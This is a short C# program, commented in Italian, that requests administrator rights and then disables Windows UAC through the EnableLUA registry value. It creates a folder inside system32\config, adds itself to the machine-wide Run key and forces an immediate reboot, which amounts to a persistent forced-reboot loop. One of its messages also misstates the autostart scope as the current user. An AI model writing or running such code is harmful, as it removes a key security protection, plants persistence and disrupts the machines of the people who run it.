﻿using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

class Program
{
    static void Main(string[] args)
    {
        // Percorso cartella da creare - modifica qui
        string targetPath = @"C:\Windows\system32\config\OSDATA";

        if (!IsRunningAsAdmin())
        {
            try
            {
                // Rilancio con privilegi elevati (UAC)
                var psi = new ProcessStartInfo
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas",
                    Arguments = String.Join(" ", args)
                };
                Process.Start(psi);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Impossibile richiedere permessi amministrativi: " + ex.Message);
            }
            return;
        }

        try
        {
            DisableUAC();

            CreateFolderWithPermissions(targetPath);

            SetStartupAuto();

            Console.WriteLine("Riavvio in corso...");
            RestartComputer();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Errore: " + ex.Message);
        }
    }

    static bool IsRunningAsAdmin()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    static void DisableUAC()
    {
        try
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
            rk.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            rk.Close();

            Console.WriteLine("UAC disabilitato nel registro. Riavvio necessario per applicare.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Errore disabilitando UAC: " + ex.Message);
        }
    }

    static void CreateFolderWithPermissions(string path)
    {
        if (!Directory.Exists(path))
        {
            Directory.CreateDirectory(path);
            Console.WriteLine($"Cartella creata: {path}");
        }
        else
        {
            Console.WriteLine($"La cartella esiste già: {path}");
        }

        var dirInfo = new DirectoryInfo(path);
        var dirSecurity = dirInfo.GetAccessControl();

        var administrators = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
        var rule = new FileSystemAccessRule(
            administrators,
            FileSystemRights.FullControl,
            InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
            PropagationFlags.None,
            AccessControlType.Allow);

        dirSecurity.AddAccessRule(rule);
        dirInfo.SetAccessControl(dirSecurity);

        Console.WriteLine("Permessi FullControl assegnati agli Administrators");
    }

    static void SetStartupAuto()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue("CartellaAdminAuto", exePath);
            rk.Close();

            Console.WriteLine("Avvio automatico configurato per l'utente corrente.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Errore impostando avvio automatico: " + ex.Message);
        }
    }

    static void RestartComputer()
    {
        try
        {
            Process.Start(new ProcessStartInfo("shutdown", "/r /t 5 /f")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine("Errore nel riavvio: " + ex.Message);
        }
    }
}
